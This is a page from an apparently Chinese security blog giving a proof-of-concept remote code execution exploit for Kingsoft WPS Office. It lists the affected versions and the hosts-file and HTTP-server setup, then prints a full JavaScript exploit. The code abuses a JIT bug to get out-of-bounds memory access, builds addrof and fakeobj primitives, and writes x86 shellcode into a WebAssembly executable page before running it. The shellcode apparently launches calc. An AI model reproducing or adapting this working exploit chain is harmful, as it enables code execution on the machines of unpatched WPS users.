<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    
    
    <link rel="shortcut icon" href="../../../../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>wps - ConsT27's Blog</title>
    <link href="../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../../../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "wps", url: "#_top", children: [
              {title: "\u91d1\u5c71WPS RCE", url: "#wps-rce" },
          ]},
        ];

    </script>
    <script src="../../../../../../js/base.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../%E5%88%A9%E7%94%A8360%E5%AE%89%E5%85%A8%E4%BA%91/%E5%88%A9%E7%94%A8360%E5%AE%89%E5%85%A8%E4%BA%91/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../%E5%88%A9%E7%94%A8360%E5%AE%89%E5%85%A8%E4%BA%91/%E5%88%A9%E7%94%A8360%E5%AE%89%E5%85%A8%E4%BA%91/" class="btn btn-xs btn-link">
        利用360安全云
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../lnk%E9%92%93%E9%B1%BC%E5%AE%9E%E8%B7%B5/lnk%E9%92%93%E9%B1%BC%E5%AE%9E%E8%B7%B5/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../lnk%E9%92%93%E9%B1%BC%E5%AE%9E%E8%B7%B5/lnk%E9%92%93%E9%B1%BC%E5%AE%9E%E8%B7%B5/" class="btn btn-xs btn-link">
        lnk钓鱼实践
      </a>
    </div>
    
  </div>

    

    <h1 id="wps">wps</h1>
<h2 id="wps-rce">金山WPS RCE</h2>
<p>wps影响范围为：WPS Office 2023 个人版 &lt; 11.1.0.15120</p>
<p>WPS Office 2019 企业版 &lt; 11.8.2.12085</p>
<p>POC</p>
<p>在1.html当前路径下启动http server并监听80端口，修改hosts文件（测试写死的）</p>
<p>127.0.0.1 <a href="http://clientweb.docer.wps.cn.cloudwps.cn" title="clientweb.docer.wps.cn.cloudwps.cn">clientweb.docer.wps.cn.cloudwps.cn</a></p>
<p><a href="http://xn--clientweb-ks4oh5muuaj11btp6eosf4uaj647anra01yp2ko24c.docer.wps.cn" title="漏洞触发需让域名规则满足clientweb.docer.wps.cn">漏洞触发需让域名规则满足clientweb.docer.wps.cn</a>.{xxxxx}<a href="http://wps.cn" title="wps.cn">wps.cn</a> cloudwps.cn和wps.cn没有任何关系</p>
<p>代码块在底下。（需要原pdf加wechat）</p>
<p>\<script></p>
<p>if(typeof alert === "undefined"){</p>
<p>alert = console.log;</p>
<p>}</p>
<p>let f64 = new Float64Array(1);</p>
<p>let u32 = new Uint32Array(f64.buffer);</p>
<p>function d2u(v) {</p>
<p>f64[0] = v;</p>
<p>return u32;</p>
<p>}</p>
<p>function u2d(lo, hi) {</p>
<p>u32[0] = lo;</p>
<p>u32[1] = hi;</p>
<p>return f64[0];</p>
<p>}</p>
<p>function gc(){ // major</p>
<p>for (let i = 0; i &lt; 0x10; i++) {</p>
<p>new Array(0x100000);</p>
<p>}</p>
<p>}</p>
<p>function foo(bug) {</p>
<p>function C(z) {</p>
<p>Error.prepareStackTrace = function(t, B) {</p>
<p>return B[z].getThis();</p>
<p>};</p>
<p>let p = Error().stack;</p>
<p>Error.prepareStackTrace = null;</p>
<p>return p;</p>
<p>}</p>
<p>function J() {}</p>
<p>var optim = false;</p>
<p>var opt = new Function(</p>
<p>'a', 'b', 'c',</p>
<p>'if(typeof a===\'number\'){if(a&gt;2){for(var</p>
<p>i=0;i&lt;100;i++);return;}b.d(a,b,1);return}' +</p>
<p>'g++;'.repeat(70));</p>
<p>var e = null;</p>
<p>J.prototype.d = new Function(</p>
<p>'a', 'b', '"use strict";b.a.call(arguments,b);return arguments[a];');</p>
<p>J.prototype.a = new Function('a', 'a.b(0,a)');</p>
<p>J.prototype.b = new Function(</p>
<p>'a', 'b',</p>
<p>'b.c();if(a){' +</p>
<p>'g++;'.repeat(70) + '}');</p>
<p>J.prototype.c = function() {</p>
<p>if (optim) {</p>
<p>var z = C(3);</p>
<p>var p = C(3);</p>
<p>z[0] = 0;</p>
<p>e = {M: z, C: p};</p>
<p>}</p>
<p>};</p>
<p>var a = new J();</p>
<p>// jit optim</p>
<p>if (bug) {</p>
<p>for (var V = 0; 1E4 &gt; V; V++) {</p>
<p>opt(0 == V % 4 ? 1 : 4, a, 1);</p>
<p>}</p>
<p>}</p>
<p>optim = true;</p>
<p>opt(1, a, 1);</p>
<p>return e;</p>
<p>}</p>
<p>e1 = foo(false);</p>
<p>e2 = foo(true);</p>
<p>delete e2.M[0];</p>
<p>let hole = e2.C[0];</p>
<p>let map = new Map();</p>
<p>map.set('asd', 8);</p>
<p>map.set(hole, 0x8);</p>
<p>map.delete(hole);</p>
<p>map.delete(hole);</p>
<p>map.delete("asd");</p>
<p>map.set(0x20, "aaaa");</p>
<p>let arr3 = new Array(0);</p>
<p>let arr4 = new Array(0);</p>
<p>let arr5 = new Array(1);</p>
<p>let oob_array = [];</p>
<p>oob_array.push(1.1);</p>
<p>map.set("1", -1);</p>
<p>let obj_array = {</p>
<p>m: 1337, target: gc</p>
<p>};</p>
<p>let ab = new ArrayBuffer(1337);</p>
<p>let object_idx = undefined;</p>
<p>let object_idx_flag = undefined;</p>
<p>let max_size = 0x1000;</p>
<p>for (let i = 0; i &lt; max_size; i++) {</p>
<p>if (d2u(oob_array[i])[0] === 0xa72) {</p>
<p>object_idx = i;</p>
<p>object_idx_flag = 1;</p>
<p>break;</p>
<p>}if (d2u(oob_array[i])[1] === 0xa72) {</p>
<p>object_idx = i + 1;</p>
<p>object_idx_flag = 0;</p>
<p>break;</p>
<p>}</p>
<p>}</p>
<p>function addrof(obj_para) {</p>
<p>obj_array.target = obj_para;</p>
<p>let addr = d2u(oob_array[object_idx])[object_idx_flag] - 1;</p>
<p>obj_array.target = gc;</p>
<p>return addr;</p>
<p>}</p>
<p>function fakeobj(addr) {</p>
<p>let r8 = d2u(oob_array[object_idx]);</p>
<p>if (object_idx_flag === 0) {</p>
<p>oob_array[object_idx] = u2d(addr, r8[1]);</p>
<p>}else {</p>
<p>oob_array[object_idx] = u2d(r8[0], addr);</p>
<p>}</p>
<p>return obj_array.target;</p>
<p>}</p>
<p>let bk_idx = undefined;</p>
<p>let bk_idx_flag = undefined;</p>
<p>for (let i = 0; i &lt; max_size; i++) {</p>
<p>if (d2u(oob_array[i])[0] === 1337) {</p>
<p>bk_idx = i;</p>
<p>bk_idx_flag = 1;</p>
<p>break;</p>
<p>}if (d2u(oob_array[i])[1] === 1337) {</p>
<p>bk_idx = i + 1;</p>
<p>bk_idx_flag = 0;</p>
<p>break;</p>
<p>}</p>
<p>}</p>
<p>let dv = new DataView(ab);</p>
<p>function get_32(addr) {</p>
<p>let r8 = d2u(oob_array[bk_idx]);</p>
<p>if (bk_idx_flag === 0) {</p>
<p>oob_array[bk_idx] = u2d(addr, r8[1]);</p>
<p>} else {</p>
<p>oob_array[bk_idx] = u2d(r8[0], addr);</p>
<p>}</p>
<p>let val = dv.getUint32(0, true);</p>
<p>oob_array[bk_idx] = u2d(r8[0], r8[1]);</p>
<p>return val;</p>
<p>}</p>
<p>function set_32(addr, val) {</p>
<p>let r8 = d2u(oob_array[bk_idx]);</p>
<p>if (bk_idx_flag === 0) {</p>
<p>oob_array[bk_idx] = u2d(addr, r8[1]);</p>
<p>} else {</p>
<p>oob_array[bk_idx] = u2d(r8[0], addr);</p>
<p>}</p>
<p>dv.setUint32(0, val, true);</p>
<p>oob_array[bk_idx] = u2d(r8[0], r8[1]);</p>
<p>}</p>
<p>function write8(addr, val) {</p>
<p>let r8 = d2u(oob_array[bk_idx]);</p>
<p>if (bk_idx_flag === 0) {</p>
<p>oob_array[bk_idx] = u2d(addr, r8[1]);</p>
<p>} else {</p>
<p>oob_array[bk_idx] = u2d(r8[0], addr);</p>
<p>}</p>
<p>dv.setUint8(0, val);</p>
<p>}</p>
<p>let fake_length = get_32(addrof(oob_array)+12);</p>
<p>set_32(get_32(addrof(oob_array)+8)+4,fake_length);</p>
<p>let wasm_code = new</p>
<p>Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,</p>
<p>128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,</p>
<p>128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0</p>
<p>,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);</p>
<p>let wasm_mod = new WebAssembly.Module(wasm_code);</p>
<p>let wasm_instance = new WebAssembly.Instance(wasm_mod);</p>
<p>let f = wasm_instance.exports.main;</p>
<p>let target_addr = addrof(wasm_instance)+0x40;</p>
<p>let rwx_mem = get_32(target_addr);</p>
<p>//alert("rwx_mem is"+rwx_mem.toString(16));</p>
<p>const shellcode = new Uint8Array([0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89,</p>
<p>0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30,0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14,</p>
<p>0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff,0xac, 0x3c, 0x61, 0x7c,</p>
<p>0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf2, 0x52,0x57, 0x8b,</p>
<p>0x52, 0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 0xe3, 0x48, 0x01,</p>
<p>0xd1,0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3, 0x3a, 0x49,</p>
<p>0x8b, 0x34, 0x8b,0x01, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 0xc7,</p>
<p>0x38, 0xe0, 0x75, 0xf6, 0x03,0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe4, 0x58,</p>
<p>0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b,0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01,</p>
<p>0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24,0x24, 0x5b, 0x5b, 0x61,</p>
<p>0x59, 0x5a, 0x51, 0xff, 0xe0, 0x5f, 0x5f, 0x5a, 0x8b, 0x12, 0xeb,0x8d, 0x5d,</p>
<p>0x6a, 0x01, 0x8d, 0x85, 0xb2, 0x00, 0x00, 0x00, 0x50, 0x68, 0x31, 0x8b,</p>
<p>0x6f,0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x68, 0xa6, 0x95, 0xbd,</p>
<p>0x9d, 0xff, 0xd5,0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,</p>
<p>0x47, 0x13, 0x72, 0x6f, 0x6a,0x00, 0x53, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63,</p>
<p>0x00]);</p>
<p>for(let i=0;i\&lt;shellcode.length;i++){</p>
<p>write8(rwx_mem+i,shellcode[i]);</p>
<p>}</p>
<p>f();</p>
<p>\</script></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../%E5%88%A9%E7%94%A8360%E5%AE%89%E5%85%A8%E4%BA%91/%E5%88%A9%E7%94%A8360%E5%AE%89%E5%85%A8%E4%BA%91/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../%E5%88%A9%E7%94%A8360%E5%AE%89%E5%85%A8%E4%BA%91/%E5%88%A9%E7%94%A8360%E5%AE%89%E5%85%A8%E4%BA%91/" class="btn btn-xs btn-link">
        利用360安全云
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../lnk%E9%92%93%E9%B1%BC%E5%AE%9E%E8%B7%B5/lnk%E9%92%93%E9%B1%BC%E5%AE%9E%E8%B7%B5/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../lnk%E9%92%93%E9%B1%BC%E5%AE%9E%E8%B7%B5/lnk%E9%92%93%E9%B1%BC%E5%AE%9E%E8%B7%B5/" class="btn btn-xs btn-link">
        lnk钓鱼实践
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="container-fluid wm-page-content">
  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
</footer>

</body>
</html>